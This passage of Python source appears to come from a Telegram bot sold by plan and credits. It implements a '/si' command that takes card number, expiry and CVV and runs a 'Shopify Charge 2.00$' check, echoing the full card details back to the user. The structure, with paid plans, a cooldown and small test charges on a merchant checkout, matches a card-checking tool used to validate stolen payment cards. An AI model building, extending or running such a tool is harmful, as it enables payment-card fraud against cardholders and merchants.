            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            try:
                cc = parsed[0] if 'parsed' in locals() else ""
                mes = parsed[1] if 'parsed' in locals() else ""
                ano = parsed[2] if 'parsed' in locals() else ""
                cvv = parsed[3] if 'parsed' in locals() else ""
            except:
                cc = mes = ano = cvv = ""
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:30]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["si", ".si", "$si"]))
@auth_and_free_restricted
async def handle_shopify_kauffman(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "si")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE 2.00$]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/si</code>
🠪 <b>Usage</b>: <code>/si cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/si 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge 2$ - Direct Checkout</code>""")
            return

        full_text = message.text
        command_parts = full_text.split(maxsplit=1)
        if len(command_parts) < 2:
            await message.reply("Please provide card details")
            return
        
        card_input = command_parts[1].strip()

        parsed = parse_card_input(card_input)
        if not parsed:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract card details.
🠪 <b>Format</b>: <code>cc|mm|yy|cvv</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parsed

        processing_msg = await message.reply(
            f"""
<b>[#Shopify Charge 2.00$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 2.00$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyKauffmanChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_input,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="si",
                    gateway_name="Shopify Charge 2.00$"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_input, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: `{str(e)[:100]}`
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
